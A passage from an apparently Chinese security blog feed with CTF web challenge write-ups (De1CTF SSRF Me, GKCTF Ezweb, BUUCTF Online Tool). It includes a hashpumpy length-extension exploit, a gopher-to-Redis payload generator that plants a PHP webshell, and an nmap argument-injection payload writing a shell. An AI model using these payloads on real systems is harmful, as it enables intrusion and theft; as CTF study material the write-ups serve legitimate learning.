class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>å°† secert_key å’Œ param å’Œ action æ‹¼åœ¨ä¸€èµ·ï¼Œå¯¹å…¶md5ç­¾åã€‚secert_keyæ˜¯éšæœºç”Ÿæˆçš„16ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²ã€‚</p><p>ç„¶åæ¥çœ‹wafå‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>ç¦æ­¢paramå‚æ•°ä»¥<code>gopher</code>å’Œ<code>file</code>å¼€å¤´ã€‚</p><p>å†æ¥çœ‹åˆ° Task ç±»çš„ Exec æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> self.checkSign():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> resp == <span class="string">&quot;Connection Timeout&quot;</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>é¦–å…ˆéªŒè¯ç­¾åï¼Œå¦‚æœæ˜¯<code>scan</code>ç±»å‹å°±è°ƒç”¨ scan æ–¹æ³•æ¥è¯»å–å†…å®¹å¹¶å†™åˆ°æ²™ç›’ä¸‹çš„ <code>result.txt</code> æ–‡ä»¶ã€‚å¦‚æœæ˜¯<code>read</code>ç±»å‹å°±è¯»å–æ²™ç›’ä¸­çš„<code>result.txt</code>å†…å®¹ã€‚</p><p>é‚£æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ï¼š</p><ul><li>è¯»å– flag.txt åˆ° result.txtã€‚</li><li>å±•ç¤º result.txt çš„å†…å®¹ã€‚</li></ul><h4 id="æ–¹æ³•ä¸€">æ–¹æ³•ä¸€</h4><p>é¢„æœŸè§£æ³•ï¼šå“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»+CVE-2019-9948(urllib)</p><p>ç®€å•æ¥è¯´MD5æ‰©å±•é•¿åº¦æ”»å‡»çš„åŸç†ï¼š</p><blockquote><p><a href="https://www.jianshu.com/p/241e772a513f">https://www.jianshu.com/p/241e772a513f</a></p></blockquote><blockquote><p>å½“å·²çŸ¥ä»¥ä¸‹ä¸‰ç‚¹</p><ul><li>md5(salt+message)çš„å€¼</li><li>messageå†…å®¹</li><li>salt+messageé•¿åº¦</li></ul><p>æˆ‘ä»¬å¯ä»¥åœ¨ä¸çŸ¥é“saltçš„å…·ä½“å†…å®¹çš„æƒ…å†µä¸‹ï¼Œè®¡ç®—å‡ºä»»æ„çš„md5(salt+message+padding+append)å€¼</p></blockquote><p>urlopenæœ‰ä¸¤ç§åŠæ³•å¯ä»¥è¯»å–åˆ°æœ¬åœ°æ–‡ä»¶ã€‚</p><ul><li>ç›´æ¥å†™æ–‡ä»¶åï¼Œå‰é¢å•¥éƒ½åˆ«å¸¦ã€‚</li><li>local_file: ,å‚è€ƒ <a href="https://bugs.python.org/issue35907">https://bugs.python.org/issue35907</a></li></ul><p>Pythonè„šæœ¬expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://34b95521-f528-44e1-bcf5-b55918e71fc1.node3.buuoj.cn/&#x27;</span></span><br><span class="line">param = <span class="string">&#x27;flag.txt&#x27;</span></span><br><span class="line">r = requests.get(url + <span class="string">&#x27;getSign&#x27;</span>, params=&#123;<span class="string">&#x27;param&#x27;</span>: param&#125;)</span><br><span class="line">sign = r.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate sign</span></span><br><span class="line">hash_sign = hashpumpy.hashpump(sign, param + <span class="string">&#x27;scan&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url + <span class="string">&#x27;De1ta&#x27;</span>, params=&#123;<span class="string">&#x27;param&#x27;</span>: param&#125;, cookies=&#123;</span><br><span class="line">    <span class="string">&#x27;sign&#x27;</span>: hash_sign[<span class="number">0</span>],</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: urllib.parse.quote(hash_sign[<span class="number">1</span>][len(url):])</span><br><span class="line">&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h4 id="æ–¹æ³•äºŒ">æ–¹æ³•äºŒ</h4><p>è¦æƒ³è¿›å…¥å¯¹actionåˆ¤æ–­çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚å…ˆéªŒè¯ç­¾åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><ol><li>åœ¨<code>checkSign()</code>å‡½æ•°çš„æ¯”è¾ƒä¸­ï¼Œå·¦è¾¹æ˜¯<code>getSign(self.action, self.param)</code>ï¼Œå³è¾¹æ˜¯<code>getSign('scan', param)</code>ï¼ˆå› ä¸ºåœ¨è®¿é—®geneSigné¡µé¢æ—¶ï¼Œæ˜¯è‡ªåŠ¨ä¼ å…¥<code>scan</code>å‚æ•°ï¼‰ã€‚</li><li>å¦‚æœå†å†™æ·±ä¸€ç‚¹ï¼Œå·¦è¾¹æ˜¯<code>md5(key + self.param + self.action)</code>ï¼Œè€ƒè™‘åˆ°è¦è¯»å–<code>flag.txt</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å†™æˆ<code>md5(key + 'flag.txt' + self.action)</code>ã€‚</li><li>ä¸ºäº†ä¿è¯Exec()å‡½æ•°ä¸­scanéƒ¨åˆ†å’Œreadéƒ¨åˆ†éƒ½èƒ½è¢«æ‰§è¡Œï¼Œ<code>self.action</code>å¿…é¡»æœ‰<code>readscan</code>æˆ–<code>scanread</code>è¿™æ ·çš„å­—ç¬¦ä¸²ï¼ˆæ³¨æ„ï¼šæºç ä¸­ç”¨<code>in</code>æ“ä½œç¬¦è€Œä¸æ˜¯ç”¨<code>==</code>ï¼‰ã€‚</li><li>ç­‰å·å³è¾¹æ˜¯<code>md5(key + param + 'scan')</code>ï¼Œæ‰€ä»¥å¯ä»¥å°†ç­‰å·å·¦è¾¹çš„<code>self.action</code>å®šä¸º<code>readscan</code>ã€‚</li><li>è¿™æ ·ä¸€æ¥ï¼Œç­‰å·å·¦è¾¹ä¸º<code>md5(key + 'flag.txt' + 'readscan')</code>ï¼Œç°åœ¨å°±å‰©ä¸‹ç­‰å·å³è¾¹çš„<code>param</code>å‚æ•°æ²¡æœ‰ç¡®å®šï¼Œé‚£ä¹ˆä¸ºäº†éªŒè¯é€šè¿‡ï¼Œæˆ‘ä»¬å¯ä»¥å°†<code>param=flag.txtread</code>ä¼ å‚ã€‚</li><li>æœ€åä¹Ÿå°±ç­‰ä»·äº<code>md5(key + 'flag.txt' + 'readscan') == md5(key + 'flag.txtread' + 'scan') </code></li></ol><p>payload1</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620230158.png" alt=""></p><p>payload2</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620230222.png" alt=""></p><h2 id="GKCTF2020-Ezweb">GKCTF2020 Ezweb</h2><p>æ‰“å¼€é¢˜ç›®æŸ¥çœ‹æºä»£ç </p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711220548.png" alt=""></p><p>æ·»åŠ ä¸€ä¸‹<code>?secret</code>å‚æ•°ï¼Œè¿”å›äº†<code>ifconfig</code>å‘½ä»¤çš„ç»“æœ</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711220700.png" alt=""></p><p>åº”è¯¥æ˜¯SSRFæ¼æ´åˆ©ç”¨äº†ï¼Œå…ˆå°è¯•ç”¨fileåè®®è¯»æ–‡ä»¶ï¼Œå‘ç°è¢«banæ‰äº†ï¼Œç”¨<code>file:/</code>æˆ–è€…<code>file: ///</code>ç»•è¿‡ï¼š</p><p>payloadï¼š<code>file: ///var/www/html/index.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711220855.png" alt=""></p><p>å®¡è®¡ä¸€ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//var_dump($match);</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;åˆ«è¿™æ ·&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»æºç ä¸­å¯çŸ¥è¿‡æ»¤äº†fileåè®®ã€dictåè®®ã€127.0.0.1å’Œlocalhostï¼Œä½†æ²¡æœ‰è¿‡æ»¤httpåè®®å’Œgopheråè®®ã€‚</p><p>æ—¢ç„¶ç»™äº†å†…ç½‘åœ°å€ï¼Œé‚£ä¹ˆå…ˆhttpåè®®æ¢æµ‹ä¸€ä¸‹å†…ç½‘ä¸»æœºå­˜æ´»ï¼Œç›´æ¥ä¸Šå·¥å…·Fuzzï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711225350.png" alt=""></p><p>11ç«¯å£çš„å›æ˜¾ç»™äº†ä¸€ä¸ªhint</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711225429.png" alt=""></p><p>æ¥ç€ç”¨httpåè®®å»Fuzzè¿™ä¸ªä¸»æœºçš„ç«¯å£</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711234135.png" alt=""></p><p>å‘ç°äº†è¿è¡Œç€RedisæœåŠ¡ï¼Œç›´æ¥ç”¨ä¸‹é¢è¿™ä¸ª<a href="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Redis4-x-5-x%E4%BB%8ESSRF%E5%88%B0RCE">è„šæœ¬</a>ç”Ÿæˆpayloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.10.238.11&quot;</span>      // è¿è¡Œæœ‰redisçš„ä¸»æœºip</span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line"> <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line"> <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line"> <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line"> <span class="string">&quot;save&quot;</span></span><br><span class="line"> ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd+=CRLF</span><br><span class="line"><span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">payload += urllib.quote(redis_format(x))</span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711235713.png" alt=""></p><p>ç”ŸæˆPayloadåç›´æ¥æ”¾åœ¨è¾“å…¥æ¡†ä¸­æ‰“è¿‡å»ï¼Œå†è¾“å…¥<code>http://173.10.238.11/shell.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711235812.png" alt=""></p><h2 id="HITCON-2017-SSRFme">HITCON 2017 SSRFme</h2><h3 id="TODO">TODO</h3><h2 id="ç½‘é¼æ¯-2018-Fakebook">ç½‘é¼æ¯ 2018 Fakebook</h2><h3 id="TODO-v2">TODO</h3><h2 id="ç½‘é¼æ¯-2020-ç„æ­¦ç»„-SSRFMe">ç½‘é¼æ¯ 2020 ç„æ­¦ç»„ SSRFMe</h2><h3 id="TODO-v3">TODO</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;De1CTF2019-SSRF-Me&quot;&gt;De1CTF2019 SSRF Me&lt;/h2&gt;
&lt;h3 id=&quot;è€ƒç‚¹&quot;&gt;è€ƒç‚¹&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Pythonä»£ç å®¡è®¡&lt;/li&gt;
&lt;li&gt;MD5æ‰©å±•æ”»å‡»&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;è§£é¢˜&quot;&gt;è§£é¢˜&lt;/h3&gt;

      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="SSRF" scheme="http://ca0y1h.top/categories/CTF/SSRF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”XSS</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS/</id>
    <published>2020-08-18T09:58:47.000Z</published>
    <updated>2020-08-18T10:54:06.093Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-åä¸œåŒ—èµ›åŒº-Web2">[CISCN2019 åä¸œåŒ—èµ›åŒº]Web2</h2><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web9">[CISCN2019 åä¸œå—èµ›åŒº]Web9</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CISCN2019-åä¸œåŒ—èµ›åŒº-Web2&quot;&gt;[CISCN2019 åä¸œåŒ—èµ›åŒº]Web2&lt;/h2&gt;
&lt;h2 id=&quot;CISCN2019-åä¸œå—èµ›åŒº-Web9&quot;&gt;[CISCN2019 åä¸œå—èµ›åŒº]Web9&lt;/h2&gt;

      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="XSS" scheme="http://ca0y1h.top/categories/CTF/XSS/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”å‘½ä»¤æ‰§è¡Œ</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2020-08-18T09:58:31.000Z</published>
    <updated>2020-08-18T12:29:36.430Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping">GXYCTF2019 Ping Ping Ping</h2><h3 id="TODO">TODO</h3><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Exec">ACTF2020 æ–°ç”Ÿèµ› Exec</h2><h3 id="TODO-v2">TODO</h3><h2 id="BUUCTF2018-Online-Tool">BUUCTF2018 Online Tool</h2><h3 id="è€ƒç‚¹">è€ƒç‚¹</h3><ul><li>Nmapå‚æ•°æ³¨å…¥</li></ul><h3 id="è§£é¢˜">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒä¹‹å‰å­¦ä¹ PHPä»£ç å®¡è®¡çš„<a href="https://ca0y1h.top/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5/#PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0Day5%E2%80%94%E2%80%94escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93">ä¸€ç¯‡æ–‡ç« </a>ï¼Œescapeshellargå‡½æ•°å’Œescapeshellcmdå‡½æ•°åŒæ—¶ä½¿ç”¨ä¼šå¯¼è‡´å•å¼•å·é€ƒé€¸ã€‚</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="string">&quot;&#x27; &lt;?php phpinfo();?&gt; -oN shell.php &#x27;&quot;</span>;</span><br><span class="line">$host = (<span class="keyword">string</span>)$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;host:&quot;</span>.$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$arg = escapeshellarg($host);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;arg:&quot;</span>.$arg;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$cmd = escapeshellcmd($arg);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;cmd:&quot;</span>.$cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯¹äºå•ä¸ªå•å¼•å·, escapeshellarg()å‡½æ•°è½¬ä¹‰å,è¿˜ä¼šåœ¨å·¦å³å„åŠ ä¸€ä¸ªå•å¼•å·,ä½†escapeshellcmd()å‡½æ•°æ˜¯ç›´æ¥åŠ ä¸€ä¸ªè½¬ä¹‰ç¬¦ã€‚<br>å¯¹äºæˆå¯¹çš„å•å¼•å·, escapeshellcmd()å‡½æ•°é»˜è®¤ä¸è½¬ä¹‰,ä½†escapeshellarg()å‡½æ•°è½¬ä¹‰ã€‚<br>hostå‚æ•°å…ˆç»è¿‡escapeshellarg()å†ç»è¿‡escapeshellcmd()å°±ä¼šå‡ºç°é—®é¢˜ã€‚<br>escapeshellarg å…ˆè½¬ä¹‰äº†ä¸€ä¸ªå•å¼•å·,ç„¶åå¼•å…¥äº†ä¸€å¯¹å•å¼•å·, escapeshellcmd ä¸ä¼šè½¬ä¹‰æˆå¯¹çš„å•å¼•å·,ä½†æ˜¯ä¼šè½¬ä¹‰è½¬ç§»ç¬¦<code>\</code>ï¼Œè¿™æ ·, è½¬ç§»ç¬¦ä½œç”¨å¤±æ•ˆ,é€ƒé€¸å‡ºæ¥ä¸€ä¸ªå•å¼•å·ã€‚</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php &#96;cat &#x2F;flag&#96;;?&gt; -oN shell.php &#39;</span><br></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯2020-æœ±é›€ç»„-Nmap">ç½‘é¼æ¯2020 æœ±é›€ç»„ Nmap</h2><h3 